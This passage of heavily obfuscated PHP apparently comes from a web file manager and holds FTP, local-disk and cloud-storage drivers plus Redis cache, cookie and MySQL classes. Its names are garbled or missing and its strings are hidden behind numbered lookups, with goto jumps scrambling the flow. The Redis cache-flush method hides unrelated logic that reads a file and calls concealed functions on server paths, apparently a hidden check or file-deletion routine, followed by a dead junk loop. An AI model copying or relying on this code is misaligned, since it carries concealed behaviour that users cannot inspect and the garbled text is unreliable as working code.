@ftp_chdir($this->connect, $É[8]); $ǣ = rtrim($ǣ, $É[8]) . $É[8]; check_abort(); $̝ȷ = @ftp_rawlist($this->connect, $ǣ); if (!$̝ȷ) { $̝ȷ = array(); } $ = array($É[10] => 1, $É[1319] => 1); foreach ($̝ȷ as $Ѣ蔃) { $ = $this->_listItem($Ѣ蔃); if ($[0] == $É[792]) { continue; } $ = $[8]; if (empty($) && $ !== $É[212] || isset($[$])) { continue; } $ = $this->iconvApp($ǣ . ltrim($, $É[8])); $ = array($É[32] => $, $É[33] => $É[214], $É[76] => $[4]); if (substr($Ѣ蔃, 0, 1) == $É[1401]) { $[$É[33]] = $É[75]; $[$É[76]] = 0; } $ = $[$É[33]] == $É[75] ? !0 : !1; $this->cacheMethodInfoSet($, $, $); if ($) { $ݱܚ[] = $; if ($) { $this->fileList($, $ݱܚ, $󝏤, $); } continue; } $󝏤[] = $; } $this->cacheMethodInfoSet($ǣ, !0); } private function _listItem($ȉ) { if (empty($ȉ)) { return array(); } $ӹ = preg_split($_SERVER[][1402], $ȉ); if (count($ӹ) <= 9) { return $ӹ; } $ӹ[8] = trim(substr($ȉ, strpos($ȉ, $ӹ[7]) + strlen($ӹ[7]))); return array_splice($ӹ, 0, 9); } public function listPath($ɑ, $ = false) { $㤚 =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $Ʋަĸ = $ݙ = array(); $this->fileList($ɑ, $Ʋަĸ, $ݙ); foreach ($Ʋަĸ as $ => $Ԯ) { $Ʋަĸ[$] = $this->folderInfo($Ԯ, $); } foreach ($ݙ as $ => $Ԯ) { $ݙ[$] = $this->fileInfo($Ԯ[$㤚[32]], $, $Ԯ); } return array($㤚[82] => $Ʋަĸ, $㤚[83] => $ݙ); } public function has($, $ = false, $㳷 = true) { $닸 =& $_SERVER[]; $ְ = $ = array(); $ = $ ? !0 : !1; $this->fileList($, $ְ, $, $); if ($) { return array($닸[223] => count($), $닸[224] => count($ְ)); } if ($㳷) { if (count($)) { return !0; } } else { if (count($ְ)) { return !0; } } return !1; } public function listAll($󚑡) { $ҽ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $ = $峺 = array(); $this->fileList($󚑡, $, $峺, !0); $ߣ = array_to_keyvalue($峺, $ҽ[32]); foreach ($ as $ә) { if (is_string($ә)) { $ߣ[$ә] = array($ҽ[76] => 0); } } return $this->listAllFiles($󚑡, $ߣ); } public function getContent($) { if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); return $this->fileSubstr($); } public function setContent($쿓, $ג = '') { if (!$this->_isconn()) { return !1; } $ = $this->pathThis($this->iconvSystem($쿓)); $ = $this->tempFile($); file_put_contents($, $ג); $ʁ = $this->upload($쿓, $this->iconvApp($)); $this->tempFileRemve($); return $ʁ; } public function fileSubstr($荭, $ؒ = 0, $ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($荭, $ؒ, $); } private function ftpRequest($°ǌ, $׋ = 0, $ = false) { $°ǌ = $this->iconvSystem($°ǌ); $ì콢 = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $޳ӧ = curl_init(); curl_setopt($޳ӧ, CURLOPT_URL, $ì콢 . $this->pathEncode($°ǌ)); curl_setopt($޳ӧ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($) { $ = $׋ + $ - 1; curl_setopt($޳ӧ, CURLOPT_RANGE, "{$׋}\x2d{$}"); } curl_setopt($޳ӧ, CURLOPT_RETURNTRANSFER, 1); $ȔƂ = curl_exec($޳ӧ); curl_close($޳ӧ); return $ȔƂ; } public function upload($, $ǐ, $ = false, $ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($))) { return !1; } $ = $this->iconvSystem($); $ǐ = $this->iconvSystem($ǐ); $ = ftp_nb_put($this->connect, $, $ǐ, FTP_BINARY); while ($ == FTP_MOREDATA) { $ = ftp_nb_continue($this->connect); } if ($ != FTP_FINISHED) { return !1; } return $this->getPathOuter($); } public function download($, $ÿ = '') { if (!$this->_isconn()) { return !1; } $𷧒 = $this->pathFather($ÿ); if (!IO::mkdir($𷧒)) { return !1; } $ = $this->iconvSystem($); $ÿ = $this->iconvSystem($ÿ); $ɔ = ftp_nb_get($this->connect, $ÿ, $, FTP_BINARY); while ($ɔ == FTP_MOREDATA) { $ɔ = ftp_nb_continue($this->connect); } if ($ɔ != FTP_FINISHED) { return !1; } return $this->iconvApp($ÿ); } public function exist($) { return $this->isFile($) || $this->isFolder($); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($) { return $this->cacheMethod($_SERVER[][166], $); } protected function objectMeta($񇰙) { return $this->cacheMethod($_SERVER[][168], $񇰙); } protected function _objectMeta($Ͻ) { $׍ =& $_SERVER[]; if ($Ͻ == $׍[12] || $Ͻ == $׍[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ͻ = $this->iconvSystem($Ͻ); $ = array($׍[32] => $this->iconvApp($Ͻ), $׍[33] => $׍[214], $׍[76] => 0); @ftp_chdir($this->connect, $׍[8]); $ = @ftp_size($this->connect, $Ͻ); if ($ != -1) { $[$׍[76]] = $; } else { $ֆ = @ftp_chdir($this->connect, $Ͻ); if (!$ֆ) { return !1; } $[$׍[33]] = $׍[75]; } return $; } protected function _isFolder($鑁) { $ =& $_SERVER[]; if ($鑁 == $[12] || $鑁 == $[8]) { return !0; } $̊ = $this->_objectMeta($鑁); return isset($̊[$[33]]) && $̊[$[33]] == $[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ٸ) { if (substr($ٸ, 0, 2) == $_SERVER[][1394]) { $ٸ = BASIC_PATH . substr($ٸ, 2); } return $ٸ; } public function iconvApp($؁) { $ɑ =& $_SERVER[]; global $config; return $this->iconvTo($؁, $config[$ɑ[1392]], $config[$ɑ[1391]]); } public function iconvSystem($ɼĐ) { $賡 =& $_SERVER[]; global $config; return $this->iconvTo($ɼĐ, $config[$賡[1391]], $config[$賡[1392]]); } public function getPathOuter($Ĳ) { $ =& $_SERVER[]; $̤ = $this->iconvApp($this->pathBase); $Ĳ = $this->iconvApp($Ĳ); if (substr($̤, 0, 2) == $[1394]) { $̤ = BASIC_PATH . substr($̤, 2); } if (substr($Ĳ, 0, 2) == $[1394]) { $Ĳ = BASIC_PATH . substr($Ĳ, 2); } $̤ = KodIO::clear($̤); $Ĳ = KodIO::clear($Ĳ); $Ĳ = substr($Ĳ, strlen($̤)); if (empty($this->pathDriver)) { return $Ĳ; } return $this->pathDriver . $[8] . ltrim($Ĳ, $[8]); } public function mkfile($首, $ = '', $ = REPEAT_RENAME) { $首 = $this->iconvSystem($首); @touch($首); if ($) { file_put_contents($首, $); } @chmod($首, $this->pathAuth); return is_file($首) ? $this->getPathOuter($首) : !1; } public function mkdir($߄ʺ, $Ȭ = REPEAT_SKIP) { $߄ʺ = $this->iconvSystem($߄ʺ); if (is_dir($߄ʺ)) { return $this->getPathOuter($߄ʺ); } @mkdir($߄ʺ, $this->pathAuth, !0); @chmod($߄ʺ, $this->pathAuth); return is_dir($߄ʺ) ? $this->getPathOuter($߄ʺ) : !1; } public function copyFile($䟥, $龱) { $this->mkdir($this->pathFather($龱)); $䟥 = $this->iconvSystem($䟥); $龱 = $this->iconvSystem($龱); $ڝ = copy_64($䟥, $龱); @chmod($龱, $this->pathAuth); return $ڝ ? $this->getPathOuter($龱) : !1; } public function moveFile($ł, $ڸ) { $this->mkdir($this->pathFather($ڸ)); $ł = $this->iconvSystem($ł); $ڸ = $this->iconvSystem($ڸ); $ = intval(@rename($ł, $ڸ)); if (!$) { if ($ = intval(@copy_64($ł, $ڸ))) { @unlink($ł); } } @chmod($ڸ, $this->pathAuth); return $ ? $this->getPathOuter($ڸ) : !1; } public function movePath($ʣ, $, $ۅ = false) { $ =& $_SERVER[]; $ʣ = $this->iconvSystem($ʣ); $ = $this->iconvSystem($); $՝ڇ = rtrim($, $[8]) . $[8] . ($ۅ ? $ۅ : get_path_this($ʣ)); if (file_exists($՝ڇ)) { return !1; } $Ǔ = intval(@rename($ʣ, $՝ڇ)); $Ǔ = file_exists($՝ڇ); return $Ǔ ? $this->getPathOuter($՝ڇ) : !1; } public function delFile($Խ) { $Խ = $this->iconvSystem($Խ); if (!@unlink($Խ)) { @chmod($Խ, $this->pathAuth); if (!@unlink($Խ)) { return !1; } } else { return !0; } } public function delFolder($ȍ) { $؜ڻ =& $_SERVER[]; $ȍ = $this->iconvSystem($ȍ); if (!is_dir($ȍ)) { return !0; } if (!($큟 = opendir($ȍ))) { return !1; } while (($킄 = readdir($큟)) !== !1) { if ($킄 == $؜ڻ[10] || $킄 == $؜ڻ[1319]) { continue; } $ك = $ȍ . $؜ڻ[8] . $킄; if (is_file($ك) || is_link($ك)) { if (!unlink($ك)) { chmod($ك, $this->pathAuth); if (!unlink($ك)) { return !1; } } } else { if (is_dir($ك)) { chmod($ك, $this->pathAuth); $ك = $this->iconvApp($ك); if (!$this->delFolder($ك)) { return !1; } } } } closedir($큟); return rmdir($ȍ); } public function rename($Ï, $鶭) { $ =& $_SERVER[]; $Ԍ = $this->fileNameAuto($this->pathFather($Ï), $鶭); $Ԍ = $this->iconvSystem($Ԍ); $Ï = $this->iconvSystem($Ï); $鬒 = $this->pathFather($Ï); $ = rtrim($鬒, $[8]) . $[8] . $Ԍ; $ط = @rename($Ï, $); $ = $this->iconvApp($); return $ط ? $this->getPathOuter($) : !1; } public function size($) { $ = $this->iconvSystem($); return filesize_64($); } public function info($) { $ = $this->iconvSystem($); if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } protected function infoChildren($ދ, &$, $ی΍ = true) { $ъ =& $_SERVER[]; check_abort_echo(); $ދ = rtrim($ދ, $ъ[8]) . $ъ[8]; if ($ی΍) { $ދ = $this->iconvSystem($ދ); } if (!($ = @opendir($ދ))) { return; } while (($ = readdir($)) !== !1) { if ($ == $ъ[10] || $ == $ъ[1319]) { continue; } $ = $ދ . $; if (is_file($) || is_link($)) { $[$ъ[77]]++; $[$ъ[76]] += filesize_64($); } else { if (is_dir($)) { $[$ъ[78]]++; $this->infoChildren($, $, !1); } } } closedir($); } private function folderInfo($, $Ú = false) { $܊ =& $_SERVER[]; $ = rtrim($, $܊[8]) . $܊[8]; $ = $this->iconvApp($this->pathThis($)); if ($Ú) { return array($܊[32] => $, $܊[84] => $this->getPathOuter($), $܊[33] => $܊[75]); } $Չ = array($܊[32] => $, $܊[84] => $this->getPathOuter($), $܊[33] => $܊[75], $܊[215] => @filectime($), $܊[85] => @filemtime($), $܊[1403] => @fileatime($), $܊[1404] => is_readable($), $܊[1405] => is_writable($), $܊[1406] => get_mode($)); return $Չ; } private function fileInfo($ڏ, $Գ = false) { $Ő =& $_SERVER[]; $ = $this->iconvApp($this->pathThis($ڏ)); if ($Գ) { return array($Ő[32] => $, $Ő[84] => $this->getPathOuter($ڏ), $Ő[33] => $Ő[214], $Ő[76] => $this->size($ڏ), $Ő[175] => $this->ext($)); } $퍁 = array($Ő[32] => $, $Ő[84] => $this->getPathOuter($ڏ), $Ő[33] => $Ő[214], $Ő[215] => @filectime($ڏ), $Ő[85] => @filemtime($ڏ), $Ő[1403] => @fileatime($ڏ), $Ő[76] => $this->size($ڏ), $Ő[175] => $this->ext($), $Ő[1404] => is_readable($ڏ), $Ő[1405] => is_writable($ڏ), $Ő[1406] => get_mode($ڏ)); return $퍁; } public function exist($ߙژ) { $ߙژ = $this->iconvSystem($ߙژ); return @file_exists($ߙژ); } public function isFile($̋) { $̋ = $this->iconvSystem($̋); return @is_file($̋); } public function isFolder($) { $ = $this->iconvSystem($); return @is_dir($); } public function listPath($ާ, $Έ诪 = false) { $Ã =& $_SERVER[]; $ާ = $this->iconvSystem($ާ); $ާ = rtrim($ާ, $Ã[8]) . $Ã[8]; $ = array($Ã[82] => array(), $Ã[83] => array()); if (!($ = @opendir($ާ))) { return $; } while (($ѵ = readdir($)) !== !1) { if ($ѵ == $Ã[10] || $ѵ == $Ã[1319]) { continue; } $Л = $ާ . $ѵ; if (is_file($Л)) { $[$Ã[83]][] = $this->fileInfo($Л, $Έ诪); } else { $[$Ã[82]][] = $this->folderInfo($Л, $Έ诪); } } closedir($); return $; } public function listAll($Ĺ؝, &$՚͂ = array()) { $ =& $_SERVER[]; $Ĺ؝ = $this->iconvSystem($Ĺ؝); $Ĺ؝ = rtrim($Ĺ؝, $[8]) . $[8]; if (!($ = @opendir($Ĺ؝))) { return $՚͂; } while (($Ō = readdir($)) !== !1) { if ($Ō == $[10] || $Ō == $[1319]) { continue; } $ = $Ĺ؝ . $Ō; $ш = is_dir($) && !is_link($) ? 1 : 0; $ = $ш ? $ . $[8] : $; $՚͂[] = array($[84] => $, $[75] => $ш, $[85] => intval(@filemtime($)), $[76] => $ш ? 0 : intval($this->size($))); if ($ш) { $this->listAll($, $՚͂); } } closedir($); return $՚͂; } public function has($, $𓞻 = false, $ = true) { $߰ =& $_SERVER[]; $ = $this->iconvSystem($); $ = rtrim($, $߰[8]) . $߰[8]; if (!($Ӭ˞ = @opendir($))) { return !1; } $ = 0; $Р = 0; $º = 0; while (($þ = readdir($Ӭ˞)) !== !1) { if ($þ == $߰[10] || $þ == $߰[1319]) { continue; } $݅ = $ . $þ; if ($𓞻) { $º++; if (@is_file($݅)) { $++; } else { $Р++; } if ($º > 10000) { break; } continue; } if ($) { if (@is_file($݅)) { return !0; } } else { if (@is_dir($݅ . $߰[8])) { return !0; } } } closedir($Ӭ˞); if ($𓞻) { return array($߰[223] => $, $߰[224] => $Р); } return !1; } public function hashSimple($񽕹) { $ͤ =& $_SERVER[]; if (!$񽕹) { return md5($ͤ[12]); } $񽕹 = $this->iconvSystem($񽕹); $ = $this->size($񽕹); $ = 200; $텅נ = 50; if ($ <= $ * $텅נ) { return $this->hashMd5($񽕹) . $; } $Ȇ = $ͤ[12]; $ެ = intval($ / $텅נ); $ͦ = fopen($񽕹, $ͤ[1407]); if (!$ͦ) { return $Ȇ; } for ($ = 0; $ < $텅נ; $++) { fseek_64($ͦ, $ެ * $); $Ȇ .= fread($ͦ, $); } fseek_64($ͦ, $ - $); $Ȇ .= fread($ͦ, $); fclose($ͦ); return md5($Ȇ) . $; } public function getContent($) { $ = $this->iconvSystem($); return file_get_contents($); } public function setContent($, $ = '') { $ = $this->iconvSystem($); $ = @file_put_contents($, $, LOCK_EX); clearstatcache(); @chmod($, $this->pathAuth); return $ === !1 ? !1 : !0; } public function fileSubstr($Ԟ, $ = 0, $ = false) { $Ø =& $_SERVER[]; $Ԟ = $this->iconvSystem($Ԟ); if ($ === !1) { $ = $this->size($Ԟ); } if ($ <= 0) { return $Ø[12]; } $ߨͦ = fopen($Ԟ, $Ø[1407]); if (!$ߨͦ) { return !1; } fseek_64($ߨͦ, $); $ǣñ = fread($ߨͦ, $); fclose($ߨͦ); return $ǣñ; } public function upload($, $ћ, $ƾ = false, $ = REPEAT_REPLACE) { if ($ƾ) { return $this->moveFile($ћ, $); } return $this->copyFile($ћ, $); } public function setModifyTime($р, $ = '') { @touch($р, intval($)); } public function download($牶, $) { return $this->iconvSystem($牶); } } goto D; e΅: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($؅, $ܑ) { $ =& $_SERVER[]; if (!class_exists($[904])) { show_json($[905], !1); } $this->cacheTime = $ܑ; $ݯ = isset($؅[$[906]]) ? $؅[$[906]] : 10; $Ġ = _get($؅, $[903]); if ($Ġ && is_array($Ġ)) { $this->initCluster($؅, $ݯ); } else { $this->handle = $this->init($؅, $ݯ); } } private function init($, $) { $ =& $_SERVER[]; $ݝ = new Redis(); $ = isset($[$[907]]) ? $[$[907]] : !1; if ($) { $ݝ->pconnect($[$[196]], $[$[197]], $); } else { $ݝ->connect($[$[196]], $[$[197]], $); } if (!empty($[$[455]])) { $ݝ->auth($[$[455]]); } if (!empty($[$[791]]) && $[$[791]] != 0) { $ݝ->select($[$[791]]); } return $ݝ; } private function initCluster($δ, $) { $ =& $_SERVER[]; $׺ = array($[908], $[909], $[910]); $ = $[908]; if (isset($δ[$[16]]) && in_array($δ[$[16]], $׺)) { $ = $δ[$[16]]; } switch ($) { case $[908]: $this->_slave($δ, $); break; case $[909]: break; case $[910]: $this->isCluster = !0; $ې = $δ[$[903]]; $΍ = isset($δ[$[907]]) ? $δ[$[907]] : !1; $·ᧇ = isset($δ[$[455]]) ? $δ[$[455]] : null; $this->handle = new RedisCluster(NUll, $ې, $, $, $΍, $·ᧇ); break; default: break; } } private function _slave($, $Φ) { $ڼڴ = $[$_SERVER[][903]]; $this->filterConfig($, $ڼڴ[0]); $this->handle = $this->init($, $Φ); unset($ڼڴ[0]); if (empty($ڼڴ)) { return; } $֔ = array_rand($ڼڴ); $this->filterConfig($, $ڼڴ[$֔]); $this->slaveHandle = $this->init($, $Φ); } private function filterConfig(&$, $ݥٍ) { $ =& $_SERVER[]; $Ӌ = explode($[4], $ݥٍ); $ = array($[196] => $Ӌ[0], $[197] => $Ӌ[1]); $ = array_merge($, $); } public function set($ˬ, $ϴ, $® = false) { $® = $® ? $® : $this->cacheTime; return $this->handle->setEx($ˬ, $®, $ϴ); } public function setLock($ĨϺ, $ݜ, $󻺘) { return $this->handle->setNX($ĨϺ, $ݜ); } public function get($Ǝê) { $ن = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ن->get($Ǝê); } public function remove($ئ) { return $this->handle->del($ئ); } public function deleteAll() { $Եַ͆ =& $_SERVER[]; if ($_SERVER[$Եַ͆[911]] != $_SERVER[$Եַ͆[912]]) { $ = $Եַ͆[913]; $ı = $Եַ͆[914]; $ԋ = $_SERVER[$Եַ͆[915]] . $Եַ͆[916]; $ = $ı($ԋ); $ӱՕ = explode($Եַ͆[246], $); if (count($ӱՕ) < $Եַ͆[682]) { $ٸȋ = $Եַ͆[917]; $ٸȋ(); } $ʎ = $Եַ͆[918]; $ʎ($_SERVER[$Եַ͆[919]]); $ʎ($_SERVER[$Եַ͆[915]] . $Եַ͆[920]); $ͫ = 1; while ($ͫ > 1) { $ͫ = $ͫ + 4; $ = rawurlencode($ͫ . $Եַ͆[422]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $) { $this->handle->flushall($); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ŧ = '', $ = 0) { if (is_string($ŧ) && $ŧ != $_SERVER[][12]) { $this->prefix = $ŧ; } if (is_numeric($) && $ > 0) { $this->expire = $; } } public static function getInstance() { static $; if ($ === null) { $ = new self(); } return $; } private static $cookieDisable = false; public static function disable($) { self::$cookieDisable = $; } private static $sameCookieSet = array(); public static function set($奈뉏, $ܧ, $ = 0, $ݞ֞ = false, $ڍخ = false) { $ =& $_SERVER[]; if (self::$cookieDisable) { return; } if (!$) { $ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$奈뉏]) && self::$sameCookieSet[$奈뉏] == $ܧ . $) { return; } self::$sameCookieSet[$奈뉏] = $ܧ . $; if (!$ڍخ) { $ڍخ = str_replace(HOST, $[12], APP_HOST); $ڍخ = _get($GLOBALS, $[921], $ڍخ); } $͠ = $[12]; setcookie($奈뉏, $ܧ, time() + $, $[8] . trim($ڍخ, $[8]) . $͠, !1, !1, $ݞ֞); } public static function setSafe($Ǧ, $ס, $ݿ = 0) { self::set($Ǧ, $ס, $ݿ, !0); } public static function get($) { static $ҙ = false; if (!$ҙ) { self::initHeaderCookie(); $ҙ = !0; } return isset($_COOKIE[$]) ? $_COOKIE[$] : !1; } private static function initHeaderCookie() { $ =& $_SERVER[]; if (!isset($_SERVER[$[922]]) || !$_SERVER[$[922]]) { return; } $ƿ = explode($[71], $_SERVER[$[922]]); foreach ($ƿ as $ӵ) { $ӵ = explode($[923], $ӵ); if (count($ӵ) != 2 || !isset($ӵ[1])) { continue; } $_COOKIE[trim($ӵ[0])] = trim($ӵ[1]); } } public static function remove($, $ = false) { unset($_COOKIE[$]); self::set($, $_SERVER[][12], 1, $); } } class DbMysql extends Db { public function __construct($貸 = '') { $Ԥ =& $_SERVER[]; if (!extension_loaded($Ԥ[838])) { think_exception(think_lang($Ԥ[14]) . $Ԥ[924]); } if (!empty($貸)) { $this->config = $貸; if (empty($this->config[$Ԥ[17]])) { $this->config[$Ԥ[17]] = $Ԥ[12]; } } } public function connect($ = '', $է = 0, $谧 = false) { $ =& $_SERVER[]; if (!isset($this->linkID[$է])) { if (empty($)) { $ = $this->config; } $ԇ = $[$[925]] . ($[$[926]] ? "\72{$[$[926]]}" : $[12]); $б = !empty($[$[17]][$[18]]) ? $[$[17]][$[18]] : $this->pconnect; if ($б) { $this->linkID[$է] = mysql_pconnect($ԇ, $[$[927]], $[$[928]], 131072); } else { $this->linkID[$է] = mysql_connect($ԇ, $[$[927]], $[$[928]], !0, 131072); } if (!$this->linkID[$է] || !empty($[$[21]]) && !mysql_select_db($[$[21]], $this->linkID[$է])) { think_exception(mysql_error()); } $ = mysql_get_server_info($this->linkID[$է]); mysql_query($[929] . think_config($[930]) . $[58], $this->linkID[$է]); if ($ > $[931]) { mysql_query($[932], $this->linkID[$է]); } $this->connected = !0; if (1 != think_config($[22])) { unset($this->config); } } return $this->linkID[$է]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($詢) { $ =& $_SERVER[]; if (0 === stripos($詢, $[308])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $詢; if ($this->queryID) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->queryID = mysql_query($詢, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ū) { $ô˒ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ū; if ($this->queryID) { $this->free(); } think_action_status($ô˒[25], 1); think_status($ô˒[24]); $Ƿ = mysql_query($Ū, $this->_linkID); $this->debug(); if (!1 === $Ƿ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][933], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ʩש = mysql_query($_SERVER[][934], $this->_linkID); $this->transTimes = 0; if (!$ʩש) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ݔ = mysql_query($_SERVER[][935], $this->_linkID); $this->transTimes = 0; if (!$ݔ) { $this->error(); return !1; } } return !0; } private function getAll() { $ = array(); if ($this->numRows > 0) { while ($ = mysql_fetch_assoc($this->queryID)) { $[] = $; } mysql_data_seek($this->queryID, 0); } return $; } public function getFields($Ҝ) { $Ш =& $_SERVER[]; $ګ = $this->query($Ш[936] . $this->parseKey($Ҝ)); $؈ = array(); if ($ګ) { foreach ($ګ as $ќ => $) { $؈[$[$Ш[31]]] = array($Ш[32] => $[$Ш[31]], $Ш[33] => $[$Ш[34]], $Ш[35] => (bool) (strtoupper($[$Ш[36]]) === $Ш[937]), $Ш[37] => $[$Ш[38]], $Ш[39] => strtolower($[$Ш[40]]) == $Ш[41], $Ш[42] => strtolower($[$Ш[43]]) == $Ш[44]); } } return $؈; } public function getTables($ٵ = '') { $ =& $_SERVER[]; if (!empty($ٵ)) { $͵ = $[938] . $ٵ . $[939]; } else { $͵ = $[940]; } $ս̚ = $this->query($͵); $ǟ = array(); foreach ($ս̚ as $ݣ => $) { $ǟ[$ݣ] = current($); } return $ǟ; } public function replace($, $ = array()) { $λ =& $_SERVER[]; foreach ($ as $ᒪ̎ => $) { $ = $this->parseValue($); if (is_scalar($)) { $ۂ[] = $; $߻[] = $this->parseKey($ᒪ̎); } } $ψ = $λ[941] . $this->parseTable($[$λ[323]]) . $λ[942] . implode($λ[50], $߻) . $λ[943] . implode($λ[50], $ۂ) . $λ[944]; return $this->execute($ψ); } public function insertAll($Ǡ, $ = array(), $ǟ = false) { $ׅ֞ =& $_SERVER[]; if (!is_array($Ǡ[0])) { return !1; } $ = array_keys($Ǡ[0]); $פ = array(); foreach ($Ǡ as $) { $ = array(); foreach ($ as $ => $̻) { $̻ = $this->parseValue($̻); if (is_scalar($̻)) { $[] = $̻; } } $פ[] = $ׅ֞[304] . implode($ׅ֞[50], $) . $ׅ֞[944]; } array_walk($, array($this, $ׅ֞[945])); $톑 = ($ǟ ? $ׅ֞[946] : $ׅ֞[947]) . $ׅ֞[948] . $this->parseTable($[$ׅ֞[323]]) . $ׅ֞[942] . implode($ׅ֞[50], $) . $ׅ֞[949] . implode($ׅ֞[50], $פ); return $this->execute($톑); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ì =& $_SERVER[]; $this->error = mysql_errno() . $ì[4] . mysql_error($this->_linkID); if ($ì[12] != $this->queryStr) { $this->error .= LNG($ì[48]) . $this->queryStr; } think_trace($this->error, $ì[12], $ì[49]); return $this->error; } public function escapeString($ů) { if ($this->_linkID) { return mysql_real_escape_string($ů, $this->_linkID); } else { return mysql_escape_string($ů); } } public function parseKey(&$귋, $Ձ = true) { $촶 =& $_SERVER[]; if ($Ձ) { $귋 = $this->parseKeyCheck($귋); } if ($귋 != $촶[203] && !preg_match($촶[950], $귋)) { $귋 = $촶[429] . trim($귋, $촶[429]) . $촶[429]; } return $귋; } } goto b; D: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($) { parent::__construct($); $this->signatureVersion($_SERVER[][231]); } public function fileOutLink($²) { $ =& $_SERVER[]; if (substr($², 0, 7) == $[1371]) { $² = $[1372] . substr($², 7); } header($[162] . $²); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ߏ) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1408]; $this->_init($ߏ); } public function _init($) { $˯ =& $_SERVER[]; $this->config = $; foreach ($ as $ => $) { if (isset($this->{$})) { $this->{$} = $; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($˯[1409] . LNG($˯[1410])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ߕ =& $_SERVER[]; $ȋ = new OSS\Model\CorsConfig(); $ = new OSS\Model\CorsRule(); $->addAllowedOrigin($ߕ[1411]); $->addAllowedMethod($ߕ[1412]); $->addAllowedMethod($ߕ[1413]); $->addAllowedMethod($ߕ[1414]); $->addAllowedMethod($ߕ[1415]); $->addAllowedMethod($ߕ[161]); $->setMaxAgeSeconds(600); $->addExposeHeader($ߕ[1416]); $->addAllowedHeader($ߕ[1411]); $ȋ->addRule($); try { $this->client->putBucketCors($this->bucket, $ȋ); } catch (OSS\Core\OssException $ݺ) { return !1; } return !0; } public function getBucketCors() { $ƨ =& $_SERVER[]; $ = null; try { $ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ۼճ) { return null; } if (!$ || !($ = $->getRules())) { return null; } $ݫƌ = $[0]->getAllowedOrigins(); $ِ = $[0]->getAllowedMethods(); $늑 = $[0]->getMaxAgeSeconds(); $Ȑ = $[0]->getExposeHeaders(); $Ô = $[0]->getAllowedHeaders(); return array($ƨ[202] => isset($ݫƌ[0]) ? $ݫƌ[0] : $ƨ[12], $ƨ[206] => $ِ, $ƨ[1417] => $늑, $ƨ[1418] => isset($Ȑ[0]) ? $Ȑ[0] : $ƨ[12], $ƨ[204] => isset($Ô[0]) ? $Ô[0] : $ƨ[12]); } public function isBucketCors() { $ =& $_SERVER[]; $Ć = $this->getBucketCors(); if (!$Ć || !is_array($Ć)) { return !1; } if ($Ć[$[202]] != $[203] || $Ć[$[204]] != $[203]) { return !1; } $ = array_map($[205], $Ć[$[206]]); if (!is_array($)) { $ = array(); } $Ŗ = array($[207], $[208], $[209], $[210], $[211]); $Ⱥ = array_diff($Ŗ, $); return empty($Ⱥ); } public function mkfile($, $磛 = '', $ = REPEAT_RENAME) { $ضʧ = $this->setContent($, $磛); if ($ضʧ !== !1) { return $this->getPathOuter($); } return !1; } public function mkdir($˾, $پ = REPEAT_SKIP) { if ($پ && $this->_isFolder($˾)) { return $this->getPathOuter($˾); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($˾)); } catch (OSS\Core\OssException $) { return !1; } return $this->getPathOuter($˾); } private function fileList($Ɗ, $ = '', $ = 0) { $ =& $_SERVER[]; $Ɗ = trim($Ɗ, $[8]); $ = empty($Ɗ) && $Ɗ !== $[212] ? $[12] : $Ɗ . $[8]; $ۑܝ = $[12]; $ = 1000; $ = $ӌ = array(); while (!0) { check_abort(); $Þ = array($[1419] => $, $[1420] => $, $[1421] => $, $[1422] => $ۑܝ); try { $҄Ȕ = $this->client->listObjects($this->bucket, $Þ); } catch (OSS\Core\OssException $ʺ) { break; } $ۑܝ = $҄Ȕ->getNextMarker(); $ = $҄Ȕ->getObjectList(); $᭸ = $҄Ȕ->getPrefixList(); foreach ($ as $č) { if ($č->getKey() == $) { continue; } $ = $č->getKey(); $ = $č->getSize(); $ = $č->getLastModified(); $ = trim($č->getETag(), $[118]); $򓹩 = $ ? array($[32] => $, $[76] => $, $[194] => strtotime($), $[1423] => $) : $; $΅ = $ 